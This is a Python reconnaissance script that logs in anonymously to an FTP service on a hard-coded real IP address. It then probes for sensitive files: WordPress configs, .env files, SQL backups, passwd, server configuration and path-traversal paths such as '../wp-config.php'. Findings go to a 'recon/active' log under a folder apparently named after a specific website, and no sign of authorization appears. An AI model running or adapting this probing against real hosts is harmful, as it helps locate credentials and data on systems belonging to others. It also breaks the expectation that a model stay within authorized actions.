#!/usr/bin/env python3
"""Check file existence via MDTM/SIZE on specific files."""
import ftplib
import socket

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

# Specific interesting files to check
files_to_check = [
    # Web root files
    "wp-config.php", "/wp-config.php", "wp-config",
    ".env", "/.env", ".htaccess", "/.htaccess",
    "index.php", "index.html", "index.htm",
    "config.php", "configuration.php",
    "db.php", "database.php",
    "composer.json", "package.json",
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql",
    "admin.php", "login.php", "wp-login.php",
    "xmlrpc.php", "readme.html", "license.txt",
    "phpinfo.php", "info.php", "test.php",
    # System files  
    "passwd", "/passwd",
    "proftpd.conf", "/proftpd.conf",
    # Relative paths from chroot
    "../wp-config.php", "../.env", 
    "../../wp-config.php",
    # Named by first scan
    "FTP-shared/test.txt", "FTP-shared/readme",
    "FTP-shared/wp-config.php", "FTP-shared/config.php",
    "FTP-shared/.env", "FTP-shared/backup.sql",
    "FTP-shared/index.html", "FTP-shared/index.php",
    "root/test.txt", "root/readme",
    "root/wp-config.php", "root/config.php",
    "root/.env", "root/backup.sql",
    "root/index.html", "root/index.php",
    # Common
    "backup", "www", "html",
]

log(f"\n{'='*70}")
log("FILE EXISTENCE CHECK VIA MDTM")
log(f"{'='*70}")

ftp = ftplib.FTP()
ftp.connect(HOST, PORT, timeout=15)
ftp.login("anonymous", "anonymous@test.com")

# First, try STAT on individual files
for f in files_to_check:
    try:
        resp = ftp.sendcmd(f"STAT {f}")
        if "No such file" not in resp and "file not found" not in resp.lower() and "cannot" not in resp:
            log(f"STAT {f}: FOUND!")
            log(f"  {resp}")
        else:
            log(f"STAT {f}: {resp.strip()}")
    except Exception as e:
        error_str = str(e)
        if "550" not in error_str and "501" not in error_str:
            log(f"STAT {f} error: {error_str}")

ftp.quit()

# Now try with fresh connections for MDTM/SIZE
log(f"\n{'='*70}")
log("FILE EXISTENCE VIA MDTM + SIZE")
log(f"{'='*70}")

for f in files_to_check:
    try:
        ftp2 = ftplib.FTP()
        ftp2.connect(HOST, PORT, timeout=10)
        ftp2.login("anonymous", "anonymous@test.com")
        
        for cmd_prefix in ["MDTM", "SIZE"]:
            try:
                resp = ftp2.sendcmd(f"{cmd_prefix} {f}")
                log(f"{cmd_prefix} {f}: {resp}")
            except Exception as e:
                pass  # silent
        
        ftp2.quit()
    except:
        pass

log(f"\n{'='*70}")
log("MDTM/SIZE CHECK COMPLETE")
log(f"{'='*70}")